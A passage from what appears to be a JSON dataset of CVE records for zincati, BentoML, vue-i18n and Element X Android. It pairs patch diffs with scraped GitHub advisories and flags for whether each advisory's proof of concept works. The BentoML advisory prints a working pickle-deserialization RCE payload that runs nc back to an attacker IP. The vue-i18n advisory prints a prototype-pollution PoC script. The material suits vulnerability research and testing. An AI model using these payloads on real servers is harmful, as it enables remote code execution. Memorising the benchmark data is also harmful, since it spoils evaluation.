                "url": "https://github.com/coreos/zincati/commit/01d8e89f799e6ba21bdf7dc668abce23bd0d8f78"
            },
            {
                "content": "update_agent: skip branch check when deploying\n\nUse the new `--skip-branch-check` option when deploying new updates with\nrpm-ostree to address https://github.com/coreos/zincati/issues/558.\n\nAfter staging a new update, sanity check that the newly deployed release is on\nthe same stream as the current booted deployment and abandon the update\nif not.\n\nFilename: dist/polkit-1/rules.d/zincati.rules:\n```\n@@ -1,7 +1,8 @@\n-// Allow Zincati to deploy, and finalize a staged deployment through rpm-ostree.\n+// Allow Zincati to deploy, finalize, and cleanup a staged deployment through rpm-ostree.\n polkit.addRule(function(action, subject) {\n     if ((action.id == \"org.projectatomic.rpmostree1.deploy\" ||\n-         action.id == \"org.projectatomic.rpmostree1.finalize-deployment\") &&\n+         action.id == \"org.projectatomic.rpmostree1.finalize-deployment\") ||\n+         action.id == \"org.projectatomic.rpmostree1.cleanup\" &&\n         subject.user == \"zincati\") {\n         return polkit.Result.YES;\n     }\n```\n\nFilename: src/identity/mod.rs:\n```\n@@ -103,7 +103,7 @@\nimpl Identity {\n             compute_node_uuid(&app_id)?\n         };\n         let platform = platform::read_id(\"/proc/cmdline\")?;\n-        let stream = rpm_ostree::parse_updates_stream(&status)\n+        let stream = rpm_ostree::parse_booted_updates_stream(&status)\n             .context(\"failed to introspect OS updates stream\")?;\n \n         let id = Self {\n```\n\nFilename: src/rpm_ostree/actor.rs:\n```\n@@ -3,7 +3,7 @@\nuse super::cli_status::StatusJson;\n use super::Release;\n use actix::prelude::*;\n-use anyhow::Result;\n+use anyhow::{Context, Result};\n use filetime::FileTime;\n use log::trace;\n use std::collections::BTreeSet;\n\n@@ -107,6 +107,48 @@\nimpl Handler<QueryLocalDeployments> for RpmOstreeClient {\n     }\n }\n \n+/// Request: query pending deployment stream.\n+#[derive(Debug, Clone)]\n+pub struct QueryPendingDeploymentStream {}\n+\n+impl Message for QueryPendingDeploymentStream {\n+    type Result = Result<String>;\n+}\n+\n+impl Handler<QueryPendingDeploymentStream> for RpmOstreeClient {\n+    type Result = Result<String>;\n+\n+    fn handle(\n+        &mut self,\n+        _msg: QueryPendingDeploymentStream,\n+        _ctx: &mut Self::Context,\n+    ) -> Self::Result {\n+        trace!(\"request to get OS update stream of pending deployment\");\n+        let status = super::cli_status::invoke_cli_status(false)?;\n+        let stream = super::cli_status::parse_pending_updates_stream(&status)\n+            .context(\"failed to introspect OS updates stream of pending deployment\")?;\n+        Ok(stream)\n+    }\n+}\n+\n+/// Request: cleanup pending deployment.\n+#[derive(Debug, Clone)]\n+pub struct CleanupPendingDeployment {}\n+\n+impl Message for CleanupPendingDeployment {\n+    type Result = Result<()>;\n+}\n+\n+impl Handler<CleanupPendingDeployment> for RpmOstreeClient {\n+    type Result = Result<()>;\n+\n+    fn handle(&mut self, _msg: CleanupPendingDeployment, _ctx: &mut Self::Context) -> Self::Result {\n+        trace!(\"request to cleanup pending deployment\");\n+        super::cli_deploy::invoke_cli_cleanup()?;\n+        Ok(())\n+    }\n+}\n+\n /// Request: Register as the update driver for rpm-ostree.\n #[derive(Debug, Clone)]\n pub struct RegisterAsDriver {}\n```\n\nFilename: src/rpm_ostree/cli_deploy.rs:\n```\n@@ -93,6 +93,7 @@\nfn invoke_cli_deploy(release: Release, allow_downgrade: bool) -> Result<Release>\n     let mut cmd = std::process::Command::new(\"rpm-ostree\");\n     cmd.arg(\"deploy\")\n         .arg(\"--lock-finalization\")\n+        .arg(\"--skip-branch-check\")\n         .arg(format!(\"revision={}\", release.checksum))\n         .env(\"RPMOSTREE_CLIENT_ID\", \"zincati\");\n     if !allow_downgrade {\n\n@@ -110,6 +111,20 @@\nfn invoke_cli_deploy(release: Release, allow_downgrade: bool) -> Result<Release>\n     Ok(release)\n }\n \n+/// CLI executor for cleaning up the pending deployment.\n+pub fn invoke_cli_cleanup() -> Result<()> {\n+    let mut cmd = std::process::Command::new(\"rpm-ostree\");\n+    cmd.arg(\"cleanup\").arg(\"-p\");\n+    let out = cmd.output().context(\"failed to run 'rpm-ostree' binary\")?;\n+    if !out.status.success() {\n+        bail!(\n+            \"rpm-ostree cleanup failed:\\n{}\",\n+            String::from_utf8_lossy(&out.stderr)\n+        )\n+    };\n+    Ok(())\n+}\n+\n #[cfg(test)]\n mod tests {\n     #[allow(unused_imports)]\n```\n\nFilename: src/rpm_ostree/cli_status.rs:\n```\n@@ -98,12 +98,23 @@\npub fn parse_booted(status: &StatusJson) -> Result<Release> {\n }\n \n /// Parse updates stream for booted deployment from status object.\n-pub fn parse_updates_stream(status: &StatusJson) -> Result<String> {\n+pub fn parse_booted_updates_stream(status: &StatusJson) -> Result<String> {\n     let json = booted_json(status)?;\n     ensure!(!json.base_metadata.stream.is_empty(), \"empty stream value\");\n     Ok(json.base_metadata.stream)\n }\n \n+/// Parse updates stream for pending deployment from status object.\n+pub fn parse_pending_updates_stream(status: &StatusJson) -> Result<String> {\n+    let pending_json = status.deployments[0].clone();\n+    ensure!(!pending_json.booted, \"no pending deployment found\");\n+    ensure!(\n+        !pending_json.base_metadata.stream.is_empty(),\n+        \"empty stream value\"\n+    );\n+    Ok(pending_json.base_metadata.stream)\n+}\n+\n /// Parse local deployments from a status object.\n fn parse_local_deployments(status: &StatusJson, omit_staged: bool) -> BTreeSet<Release> {\n     let mut deployments = BTreeSet::<Release>::new();\n```\n\nFilename: src/rpm_ostree/mod.rs:\n```\n@@ -1,11 +1,14 @@\nmod cli_deploy;\n mod cli_finalize;\n mod cli_status;\n-pub use cli_status::{invoke_cli_status, parse_basearch, parse_booted, parse_updates_stream};\n+pub use cli_status::{\n+    invoke_cli_status, parse_basearch, parse_booted, parse_booted_updates_stream,\n+};\n \n mod actor;\n pub use actor::{\n-    FinalizeDeployment, QueryLocalDeployments, RegisterAsDriver, RpmOstreeClient, StageDeployment,\n+    CleanupPendingDeployment, FinalizeDeployment, QueryLocalDeployments,\n+    QueryPendingDeploymentStream, RegisterAsDriver, RpmOstreeClient, StageDeployment,\n };\n \n #[cfg(test)]\n```\n\nFilename: src/update_agent/actor.rs:\n```\n@@ -118,7 +118,7 @@\nimpl Handler<RefreshTick> for UpdateAgent {\n                 UpdateAgentMachineState::UpdateAvailable((release, _)) => {\n                     let update = release.clone();\n                     update_agent_info\n-                        .tick_stage_update(&mut agent_state_guard.machine_state, update)\n+                        .tick_stage_update(&mut agent_state_guard, update)\n                         .await\n                 }\n                 UpdateAgentMachineState::UpdateStaged((release, _)) => {\n\n@@ -335,23 +335,22 @@\nimpl UpdateAgentInfo {\n     }\n \n     /// Try to stage an update.\n-    async fn tick_stage_update(&self, mut state: &mut UpdateAgentMachineState, release: Release) {\n+    async fn tick_stage_update(&self, state: &mut UpdateAgentState, release: Release) {\n         trace!(\"trying to stage an update\");\n \n         let target = release.clone();\n         let deploy_outcome = self.attempt_deploy(target).await;\n \n         match deploy_outcome {\n             Ok(release) => {\n-                let msg = format!(\"update staged: {}\", release.version);\n-                utils::update_unit_status(&msg);\n-                log::info!(\"{}\", msg);\n-                state.update_staged(release);\n+                // Sanity check that the deployment we just staged is from the correct stream.\n+                self.check_stream(state, release.clone()).await;\n             }\n             Err(e) => {\n                 log::error!(\"failed to stage deployment: {}\", e);\n                 let release_ver = release.version.clone();\n-                let fail_count = UpdateAgentInfo::deploy_attempt_failed(release, &mut state);\n+                let fail_count =\n+                    UpdateAgentInfo::deploy_attempt_failed(release, &mut state.machine_state);\n                 let msg = format!(\n                     \"trying to stage {} ({} failed deployment attempt{})\",\n                     release_ver,\n\n@@ -464,6 +463,15 @@\nimpl UpdateAgentInfo {\n         depls\n     }\n \n+    /// Return the update stream of the pending deployment.\n+    async fn query_pending_deployment_stream(&self) -> Result<String> {\n+        let msg = rpm_ostree::QueryPendingDeploymentStream {};\n+        self.rpm_ostree_actor\n+            .send(msg)\n+            .unwrap_or_else(|e| Err(e.into()))\n+            .await\n+    }\n+\n     /// Finalize a deployment (unlock and reboot).\n     async fn finalize_deployment(&self, release: Release) -> Result<Release> {\n         log::info!(\n\n@@ -491,6 +499,52 @@\nimpl UpdateAgentInfo {\n             .unwrap_or_else(|e| log::error!(\"failed to register as driver: {}\", e))\n             .await\n     }\n+\n+    /// Cleanup pending deployment.\n+    async fn cleanup_pending_deployment(&self) {\n+        let msg = rpm_ostree::CleanupPendingDeployment {};\n+        let result = self\n+            .rpm_ostree_actor\n+            .send(msg)\n+            .unwrap_or_else(|e| Err(e.into()))\n+            .await;\n+        if let Err(e) = result {\n+            log::error!(\"failed to cleanup pending deployment: {}\", e)\n+        };\n+    }\n+\n+    /// Check that the pending deployment is from the correct update stream.\n+    /// If not, clean up the pending deployment.\n+    async fn check_stream(&self, state: &mut UpdateAgentState, release: Release) {\n+        match self.query_pending_deployment_stream().await {\n+            Ok(stream) => {\n+                if stream != self.identity.stream {\n+                    log::error!(\n+                        \"deployed an update on different update stream, abandoning update {}\",\n+                        release.version\n+                    );\n+                } else {\n+                    let msg = format!(\"update staged: {}\", release.version);\n+                    utils::update_unit_status(&msg);\n+                    log::info!(\"{}\", msg);\n+                    state.machine_state.update_staged(release);\n+                    // The release we just deployed is on the correct stream so we\n+                    // return early.\n+                    return;\n+                }\n+            }\n+            Err(e) => {\n+                log::error!(\n+                    \"failed to check pending deployment's update stream: {}, abandoning update {}\",\n+                    e,\n+                    release.version\n+                );\n+            }\n+        }\n+        self.cleanup_pending_deployment().await;\n+        state.denylist.insert(release);\n+        state.machine_state.update_abandoned();\n+    }\n }\n \n #[cfg(test)]\n```",
                "url": "https://github.com/coreos/zincati/commit/28a43aa2c1edda091ba659677d73c13e6e3ea99d"
            }
        ],
        "published_date": "2025-03-17T14:46:28.219Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\ncoreos\n/\nzincati\nPublic\nNotifications You must be signed in to change notification settings\nFork 37\nStar 168\nCode\nIssues\n18\nPull requests\n14\nActions\nSecurity\n1\nInsights\nAdditional navigation options\nUnprivileged access to rpm-ostree D-Bus `Deploy()` and `FinalizeDeployment()` methods\nLow jlebon published GHSA-w6fv-6gcc-x825 on Mar 17Mar 17, 2025\nPackage\nFedora CoreOS next\nAffected versions\n35.20211119.1.0\nPatched versions\n42.20250316.1.0\nFedora CoreOS stable\n35.20211119.3.0\n41.20250302.3.2\nFedora CoreOS testing\n35.20211119.2.0\n41.20250315.2.0\nDescription\nImpact\nZincati ships a polkit rule which allows the zincati system user to use the following actions:\norg.projectatomic.rpmostree1.deploy: used to deploy updates to the system\norg.projectatomic.rpmostree1.finalize-deployment: used to reboot the system into the deployed update\nSince Zincati v0.0.24, this polkit rule contains a logic error which broadens access of those polkit actions to any unprivileged user rather than just the zincati system user.\nIn practice, this means that any unprivileged user with access to the system D-Bus socket is able to deploy older Fedora CoreOS versions (which may have other known vulnerabilities). Note that rpm-ostree enforces that the selected version must be from the same branch the system is currently on so this cannot directly be used to deploy an attacker-controlled update payload.\nThis primarily impacts users running untrusted workloads with access to the system D-Bus socket. Note that in general, untrusted workloads should not be given this access, whether containerized or not. By default, containers do not have access to the system D-Bus socket.\nPatches\nThe logic error is fixed in Zincati v0.0.30. The fix is included in the following FCOS releases:\nOn the stable stream: 41.20250302.3.2\nOn the testing stream: 41.20250315.2.0\nOn the next stream: 42.20250316.1.0\nWorkarounds\nA workaround is to add the following polkit rule:\npolkit.addRule(function(action, subject) {\n    if (action.id == \"org.projectatomic.rpmostree1.deploy\" ||\n        action.id == \"org.projectatomic.rpmostree1.finalize-deployment\" ||\n        action.id == \"org.projectatomic.rpmostree1.cleanup\") {\n        if (subject.user != \"zincati\") {\n                return polkit.Result.NO;\n        }\n    }\n});\nto e.g. /etc/polkit-1/rules.d/00-zincati-fix.rules (it must sort earlier than zincati.rules lexicographically).\nNote that this rule will deny all non-root users other than zincati from using those actions. If you've added polkit rules to allow e.g. the core user or other users, you will need to adjust the policy (or make sure the ordering is appropriate).\nReferences\nThis issue was introduced by this commit, and is fixed in v0.0.30.\nSeverity\nLow\nCVE ID\nCVE-2025-27512\nWeaknesses\nCWE-783 CWE-863\nCredits\njlebon\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The provided advisory does not detail specific steps or a proof of concept to reproduce the vulnerability.",
                "url": "https://github.com/coreos/zincati/security/advisories/GHSA-w6fv-6gcc-x825"
            }
        ],
        "sw_version": "v0.0.24",
        "sw_version_wget": "https://github.com/coreos/zincati/archive/refs/tags/v0.0.24.zip"
    },
    "CVE-2025-27520": {
        "cwe": [
            {
                "id": "CWE-502",
                "value": "CWE-502: Deserialization of Untrusted Data"
            }
        ],
        "description": "BentoML is a Python library for building online serving systems optimized for AI apps and model inference. A Remote Code Execution (RCE) vulnerability caused by insecure deserialization has been identified in the latest version (v1.4.2) of BentoML. It allows any unauthenticated user to execute arbitrary code on the server. It exists an unsafe code segment in serde.py. This vulnerability is fixed in 1.4.3.",
        "languages": [
            "Python"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\nSigned-off-by: Frost Ming <me@frostming.com>\n\nFilename: src/_bentoml_impl/server/app.py:\n```\n@@ -296,7 +296,7 @@\nasync def create_instance(self, app: Starlette) -> None:\n                 deployment_url, service=self.service, media_type=\"application/json\"\n             )\n         else:\n-            proxy = RemoteProxy(\"http://localhost:3000\", service=self.service, app=app)\n+            proxy = RemoteProxy(\"http://localhost:3000\", service=self.service, app=app, media_type=\"application/json\")\n         self._service_instance.__self_proxy__ = proxy  # type: ignore[attr-defined]\n         self._service_instance.to_async = proxy.to_async  # type: ignore[attr-defined]\n         self._service_instance.to_sync = proxy.to_sync  # type: ignore[attr-defined]\n\n@@ -641,12 +641,19 @@\nasync def api_endpoint(self, name: str, request: Request) -> Response:\n         from _bentoml_sdk.io_models import IORootModel\n         from bentoml._internal.utils import get_original_func\n         from bentoml._internal.utils.http import set_cookies\n+        from http import HTTPStatus\n \n         from ..serde import ALL_SERDE\n \n         media_type = request.headers.get(\"Content-Type\", \"application/json\")\n         media_type = media_type.split(\";\")[0].strip()\n \n+        if self.is_main and media_type == \"application/vnd.bentoml+pickle\":\n+            raise BentoMLException(\n+                \"application/vnd.bentoml+pickle is not allowed in main server\",\n+                error_code=HTTPStatus.UNSUPPORTED_MEDIA_TYPE,\n+            )\n+\n         method = self.service.apis[name]\n         func = getattr(self._service_instance, name).local\n         ctx = self.service.context\n```",
                "url": "https://github.com/bentoml/BentoML/commit/b35f4f4fcc53a8c3fe8ed9c18a013fe0a728e194"
            }
        ],
        "published_date": "2025-04-04T14:28:51.574Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nbentoml\n/\nBentoML\nPublic\nNotifications You must be signed in to change notification settings\nFork 836\nStar 7.7k\nCode\nIssues\n125\nPull requests\n3\nDiscussions\nActions\nProjects\nSecurity\n2\nInsights\nAdditional navigation options\nRemote Code Execution (RCE) Caused by Insecure Deserialization\nCritical ssheng published GHSA-33xw-247w-6hmc on Apr 3Apr 4, 2025\nPackage\npip bentoml/BentoML\n(\npip\n)\nAffected versions\n>=1.3.4,<1.4.3\nPatched versions\n1.4.3\nDescription\nSummary\nA Remote Code Execution (RCE) vulnerability caused by insecure deserialization has been identified in the latest version(v1.4.2) of BentoML. It allows any unauthenticated user to execute arbitrary code on the server.\nDetails\nIt exists an unsafe code segment in serde.py:\ndef deserialize_value(self, payload: Payload) -> t.Any:\n    if \"buffer-lengths\" not in payload.metadata:\n        return pickle.loads(b\"\".join(payload.data))\nThrough data flow analysis, it is confirmed that the payload content is sourced from an HTTP request, which can be fully manipulated by the attack. Due to the lack of validation in the code, maliciously crafted serialized data can execute harmful actions during deserialization.\nPoC\nEnvironment:\nServer host:\nIP: 10.98.36.123\nOS: Ubuntu\nAttack host:\nIP: 10.98.36.121\nOS: Ubuntu\nFollow the instructions on the BentoML official README(https://github.com/bentoml/BentoML) to set up the environment.\n1.1 Install BentoML (Server host: 10.98.36.123) :\npip install -U bentoml\n1.2 Define APIs in a service.py file (Server host: 10.98.36.123) :\nfrom __future__ import annotations\n\nimport bentoml\n\n@bentoml.service(\n    resources={\"cpu\": \"4\"}\n)\nclass Summarization:\n    def __init__(self) -> None:\n        import torch\n        from transformers import pipeline\n\n        device = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n        self.pipeline = pipeline('summarization', device=device)\n\n    @bentoml.api(batchable=True)\n    def summarize(self, texts: list[str]) -> list[str]:\n        results = self.pipeline(texts)\n        return [item['summary_text'] for item in results]\n1.3 Run the service code (Server host: 10.98.36.123) :\npip install torch transformers  # additional dependencies for local run\n\nbentoml serve\nStart nc listening on the attacking host (Attack host: 10.98.36.121) :\nnc -lvvp 1234\nSend maliciously crafted request (Attack host: 10.98.36.121) :\nimport pickle\nimport os\nimport requests\n\nheaders = {'Content-Type': 'application/vnd.bentoml+pickle'}\n\nclass Evil:\n    def __reduce__(self):\n        return(os.system, ('nc 10.98.36.121 1234',))\n\npayload = pickle.dumps(Evil())\n\nrequests.post(\"http://10.98.36.123:3000/summarize\", data=payload, headers=headers)\nAttack success (Attack host: 10.98.36.121) :\nThe server host(10.98.36.123) has connected to the attacker's host(10.98.36.121) listening on port 1234.\nImpact\nRemote Code Execution (RCE).\nSeverity\nCritical\n9.8\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nCVE ID\nCVE-2025-27520\nWeaknesses\nCWE-502\nCredits\nc2an1\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a complete Proof of Concept (PoC) that demonstrates how to exploit the vulnerability by providing instructions and code snippets.",
                "url": "https://github.com/bentoml/BentoML/security/advisories/GHSA-33xw-247w-6hmc"
            }
        ],
        "sw_version": "v1.3.4",
        "sw_version_wget": "https://github.com/bentoml/BentoML/archive/refs/tags/v1.3.4.zip"
    },
    "CVE-2025-27597": {
        "cwe": [
            {
                "id": "CWE-1321",
                "value": "CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
            }
        ],
        "description": "Vue I18n is the internationalization plugin for Vue.js. @intlify/message-resolver and @intlify/vue-i18n-core are vulnerable to Prototype Pollution through the entry function: handleFlatJson. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence. Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.",
        "languages": [
            "TypeScript"
        ],
        "patch_commits": [
            {
                "content": "fix: prototype pollution in `handleFlatJson`\n\nFilename: packages/vue-i18n-core/src/utils.ts:\n```\n@@ -69,6 +69,9 @@\nexport function handleFlatJson(obj: unknown): unknown {\n       let currentObj = obj\n       let hasStringValue = false\n       for (let i = 0; i < lastIndex; i++) {\n+        if (subKeys[i] === '__proto__') {\n+          throw new Error(`unsafe key: ${subKeys[i]}`)\n+        }\n         if (!(subKeys[i] in currentObj)) {\n           currentObj[subKeys[i]] = create()\n         }\n```\n\nFilename: packages/vue-i18n-core/test/utils.test.ts:\n```\n@@ -1,65 +1,80 @@\n// utils\n import * as shared from '@intlify/shared'\n+import { handleFlatJson } from '../src/utils'\n+import { I18nWarnCodes, getWarnMessage } from '../src/warnings'\n vi.mock('@intlify/shared', async () => {\n   const actual = await vi.importActual<object>('@intlify/shared')\n   return {\n     ...actual,\n     warn: vi.fn()\n   }\n })\n-import { handleFlatJson } from '../src/utils'\n-import { I18nWarnCodes, getWarnMessage } from '../src/warnings'\n \n-test('handleFlatJson', () => {\n-  const mockWarn = vi.spyOn(shared, 'warn')\n-  // eslint-disable-next-line @typescript-eslint/no-empty-function\n-  mockWarn.mockImplementation(() => {})\n+describe('handleFlatJson', () => {\n+  test('basic', () => {\n+    const mockWarn = vi.spyOn(shared, 'warn')\n+    // eslint-disable-next-line @typescript-eslint/no-empty-function\n+    mockWarn.mockImplementation(() => {})\n \n-  const obj = {\n-    a: { a1: 'a1.value' },\n-    'a.a2': 'a.a2.value',\n-    'b.x': {\n-      'b1.x': 'b1.x.value',\n-      'b2.x': ['b2.x.value0', 'b2.x.value1'],\n-      'b3.x': { 'b3.x': 'b3.x.value' }\n-    },\n-    c: {\n-      'animal.dog': 'Dog',\n-      animal: 'Animal'\n-    },\n-    d: {\n-      'animal.dog': 'Dog',\n-      animal: {}\n-    }\n-  }\n-  const expectObj = {\n-    a: {\n-      a1: 'a1.value',\n-      a2: 'a.a2.value'\n-    },\n-    b: {\n-      x: {\n-        b1: { x: 'b1.x.value' },\n-        b2: { x: ['b2.x.value0', 'b2.x.value1'] },\n-        b3: { x: { b3: { x: 'b3.x.value' } } }\n+    const obj = {\n+      a: { a1: 'a1.value' },\n+      'a.a2': 'a.a2.value',\n+      'b.x': {\n+        'b1.x': 'b1.x.value',\n+        'b2.x': ['b2.x.value0', 'b2.x.value1'],\n+        'b3.x': { 'b3.x': 'b3.x.value' }\n+      },\n+      c: {\n+        'animal.dog': 'Dog',\n+        animal: 'Animal'\n+      },\n+      d: {\n+        'animal.dog': 'Dog',\n+        animal: {}\n       }\n-    },\n-    c: {\n-      'animal.dog': 'Dog',\n-      animal: 'Animal'\n-    },\n-    d: {\n-      animal: {\n-        dog: 'Dog'\n+    }\n+    const expectObj = {\n+      a: {\n+        a1: 'a1.value',\n+        a2: 'a.a2.value'\n+      },\n+      b: {\n+        x: {\n+          b1: { x: 'b1.x.value' },\n+          b2: { x: ['b2.x.value0', 'b2.x.value1'] },\n+          b3: { x: { b3: { x: 'b3.x.value' } } }\n+        }\n+      },\n+      c: {\n+        'animal.dog': 'Dog',\n+        animal: 'Animal'\n+      },\n+      d: {\n+        animal: {\n+          dog: 'Dog'\n+        }\n       }\n     }\n-  }\n \n-  expect(handleFlatJson(obj)).toEqual(expectObj)\n-  expect(mockWarn).toHaveBeenCalled()\n-  expect(mockWarn.mock.calls[0][0]).toEqual(\n-    getWarnMessage(I18nWarnCodes.IGNORE_OBJ_FLATTEN, {\n-      key: 'animal'\n-    })\n-  )\n+    expect(handleFlatJson(obj)).toEqual(expectObj)\n+    expect(mockWarn).toHaveBeenCalled()\n+    expect(mockWarn.mock.calls[0][0]).toEqual(\n+      getWarnMessage(I18nWarnCodes.IGNORE_OBJ_FLATTEN, {\n+        key: 'animal'\n+      })\n+    )\n+  })\n+\n+  // security advisories\n+  // ref: https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m\n+  test('prototype pollution', () => {\n+    expect(() =>\n+      handleFlatJson({ '__proto__.pollutedKey': 'pollutedValue' })\n+    ).toThrow()\n+    // @ts-ignore -- test\n+    // eslint-disable-next-line no-proto\n+    expect({}.__proto__.pollutedKey).toBeUndefined()\n+    // @ts-ignore -- test\n+    expect(Object.prototype.pollutedKey).toBeUndefined()\n+  })\n })\n```",
                "url": "https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a"
            }
        ],
        "published_date": "2025-03-07T15:51:39.753Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nintlify\n/\nvue-i18n\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 362\nStar 2.4k\nCode\nIssues\n133\nPull requests\n27\nDiscussions\nActions\nProjects\nSecurity\n3\nInsights\nAdditional navigation options\nPrototype Pollution in `handleFlatJson`\nHigh kazupon published GHSA-p2ph-7g93-hw3m on Mar 6Mar 7, 2025\nPackage\nnpm @intlify/core\n(\nnpm\n)\nAffected versions\n>= 9.1\nPatched versions\n9.1.11\nnpm @intlify/core-base\n(\nnpm\n)\n>= 9.1\n9.1.11\nnpm @intlify/message-resolver\n(\nnpm\n)\n>= 9.1\n9.1.11\nnpm @intlify/vue-i18n-core\n(\nnpm\n)\n>= 9.2 <= 11.1.1\n9.14.3, 10.0.6, 11.1.2\nnpm petite-vue-i18n\n(\nnpm\n)\n>= 10.0 <= 11.1.1\n10.0.6, 11.1.2\nnpm vue-i18n\n(\nnpm\n)\n>= 9.1 <= 11.1.1\n9.14.3, 10.0.6, 11.1.2\nDescription\nVulnerability type:\nPrototype Pollution\nVulnerability Location(s):\n# v9.1\nnode_modules/@intlify/message-resolver/index.js\n\n# v9.2 or later\nnode_modules/@intlify/vue-i18n-core/index.js\nDescription:\nThe latest version of @intlify/message-resolver (9.1) and @intlify/vue-i18n-core (9.2 or later), (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) handleFlatJson. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\nPoC:\n// install the package with the latest version\n~$ npm install @intlify/message-resolver@9.1.10\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n// poc.js\n(async () => {\n    const lib = await import('@intlify/message-resolver');\n    var someObj = {}\n    console.log(\"Before Attack: \", JSON.stringify({}.__proto__));\n    try {\n        // for multiple functions, uncomment only one for each execution.\n        lib.handleFlatJson ({ \"__proto__.pollutedKey\": \"pollutedValue\" })\n    } catch (e) { }\n    console.log(\"After Attack: \", JSON.stringify({}.__proto__));\n    delete Object.prototype.pollutedKey;\n})();\nSeverity\nHigh\nCVE ID\nCVE-2025-27597\nWeaknesses\nNo CWEs\nCredits\nmestrtee\nFinder\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory explicitly provides a proof of concept, including a specific code example and the expected result.",
                "url": "https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m"
            }
        ],
        "sw_version": "v9.1.0",
        "sw_version_wget": "https://github.com/intlify/vue-i18n/archive/refs/tags/v9.1.0.zip"
    },
    "CVE-2025-27599": {
        "cwe": [
            {
                "id": "CWE-926",
                "value": "CWE-926: Improper Export of Android Application Components"
            },
            {
                "id": "CWE-20",
                "value": "CWE-20: Improper Input Validation"
            }
        ],
        "description": "Element X Android is a Matrix Android Client provided by element.io. Prior to version 25.04.2, a crafted hyperlink on a webpage, or a locally installed malicious app, can force Element X up to version 25.04.1 to load a webpage with similar permissions to Element Call and automatically grant it temporary access to microphone and camera. This issue has been patched in version 25.04.2.",
        "languages": [
            "Kotlin"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\n* Check validity of Element Call url host.\n\n* Prepare release 25.04.2\n\nFilename: CHANGES.md:\n```\n@@ -1,3 +1,10 @@\n+Changes in Element X v25.04.2\n+=============================\n+\n+Security fixes \ud83d\udd10\n+-----------------\n+- Fix for [GHSA-m5px-pwq3-4p5m](https://github.com/element-hq/element-x-android/security/advisories/GHSA-m5px-pwq3-4p5m) / [CVE-2025-27599](https://www.cve.org/CVERecord?id=CVE-2025-27599)\n+\n Changes in Element X v25.04.1\n =============================\n```\n\nFilename: fastlane/metadata/android/en-US/changelogs/202504020.txt:\n```\n@@ -0,0 +1,2 @@\n+Main changes in this version: security fix.\n+Full changelog: https://github.com/element-hq/element-x-android/releases\n```\n\nFilename: features/call/impl/src/main/kotlin/io/element/android/features/call/impl/utils/CallIntentDataParser.kt:\n```\n@@ -12,25 +12,26 @@\nimport javax.inject.Inject\n \n class CallIntentDataParser @Inject constructor() {\n     private val validHttpSchemes = sequenceOf(\"https\")\n+    private val knownHosts = sequenceOf(\n+        \"call.element.io\",\n+    )\n \n     fun parse(data: String?): String? {\n         val parsedUrl = data?.let { Uri.parse(data) } ?: return null\n         val scheme = parsedUrl.scheme\n         return when {\n-            scheme in validHttpSchemes && parsedUrl.host == \"call.element.io\" -> parsedUrl\n+            scheme in validHttpSchemes -> parsedUrl\n             scheme == \"element\" && parsedUrl.host == \"call\" -> {\n-                // We use this custom scheme to load arbitrary URLs for other instances of Element Call,\n-                // so we can only verify it's an HTTP/HTTPs URL with a non-empty host\n                 parsedUrl.getUrlParameter()\n             }\n             scheme == \"io.element.call\" && parsedUrl.host == null -> {\n-                // We use this custom scheme to load arbitrary URLs for other instances of Element Call,\n-                // so we can only verify it's an HTTP/HTTPs URL with a non-empty host\n                 parsedUrl.getUrlParameter()\n             }\n             // This should never be possible, but we still need to take into account the possibility\n             else -> null\n-        }?.withCustomParameters()\n+        }\n+            ?.takeIf { it.host in knownHosts }\n+            ?.withCustomParameters()\n     }\n \n     private fun Uri.getUrlParameter(): Uri? {\n```\n\nFilename: 